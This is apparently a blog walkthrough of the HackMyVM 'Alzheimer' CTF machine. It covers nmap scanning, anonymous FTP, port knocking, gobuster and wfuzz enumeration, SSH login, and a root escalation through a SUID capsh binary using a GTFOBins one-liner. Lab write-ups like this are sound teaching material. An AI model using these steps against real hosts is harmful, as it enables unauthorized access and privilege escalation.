---
title: "Alzheimer - HackMyVM Walkthrough" 
---
nmap service scan:
{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf/alzheimer]
└─$ nmap -p- -sV 192.168.56.254 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-07 12:25 EST
Nmap scan report for dominator.hmv (192.168.56.254)
Host is up (0.00060s latency).
Not shown: 65532 closed ports
PORT   STATE    SERVICE VERSION
21/tcp open     ftp     vsftpd 3.0.3
22/tcp filtered ssh
80/tcp filtered http
Service Info: OS: Unix
{% endhighlight %}
Logging into the ftp anonymously worked and we get a .secretnote.txt. 
.secretnote.txt:

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf/alzheimer]
└─$ cat .secretnote.txt 
I need to knock this ports and 
one door will be open!
1000
2000
3000

{% endhighlight %}
let's use knock to see what this opens: 

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf/alzheimer]
└─$ knock 192.168.56.254 1000 2000 3000 -d 20 
                                                                                    
┌──(kali㉿kali)-[~/ctf/alzheimer]
└─$ nmap -p- -sV 192.168.56.254
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 12:13 EST
Nmap scan report for vinci.hmv (192.168.56.254)
Host is up (0.00060s latency).
Not shown: 65532 closed ports
PORT   STATE    SERVICE VERSION
21/tcp open     ftp     vsftpd 3.0.3
22/tcp filtered ssh
80/tcp open     http    nginx 1.14.2
Service Info: OS: Unix

{% endhighlight %}

From the index webpage:
I dont remember where I stored my password :( I only remember that was into a .txt file... -medusa

gobuster to enumerate files and directories:

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf/alzheimer]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -q -x html,php,txt,png,bin,pcap,jpg -u http://192.168.56.254/
/home                 (Status: 301) [Size: 185] [--> http://192.168.56.254/home/]
/admin                (Status: 301) [Size: 185] [--> http://192.168.56.254/admin/]
/secret               (Status: 301) [Size: 185] [--> http://192.168.56.254/secret/]
{% endhighlight %}
Let's drill down into each directory and enumerate any directories and text files:

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf/alzheimer]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -q -x html,php,txt,png,jpg -u http://192.168.56.254/secret/
/index.html           (Status: 200) [Size: 44]
/home                 (Status: 301) [Size: 185] [--> http://192.168.56.254/secret/home/]

{% endhighlight %}
Now into home:

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf/alzheimer]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -q -x html,php,txt,png,jpg -u http://192.168.56.254/secret/home
/index.html           (Status: 200) [Size: 62]
{% endhighlight %}
Let's enumerate any dot files that gobuster can't enumerate with wfuzz:

{% highlight terminal %}
┌──(kali㉿kali)-[~/ctf/winter]
└─$ wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 -u http://192.168.56.254/secret/home/FUZZ.txt
{% endhighlight %}

This approach didn't work. So I turned to a guide that pointed out the changes made
to the .secretnote.txt file after the port knocking. Turns out the password is 
appended to the .secretnote.txt file.. 

Anyways, moving on to logging in over SSH.

After logging in I checked the sudo privileges of medusa. the only command that can 
be used is id. 

SUID bins:
{% highlight terminal %}
medusa@alzheimer:~$ find / -perm -u=s -type f 2>/dev/null 
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/sbin/capsh
{% endhighlight %}

capsh is an unusual entry. gtfobins has an entry for that binary, so let's use the 
method described on the page to get a root shell on the machine: 

{% highlight terminal %}
medusa@alzheimer:~$ /usr/sbin/capsh --gid=0 --uid=0 --
{% endhighlight %}
From here I got the root flag and submitted it. Hooray for points. 
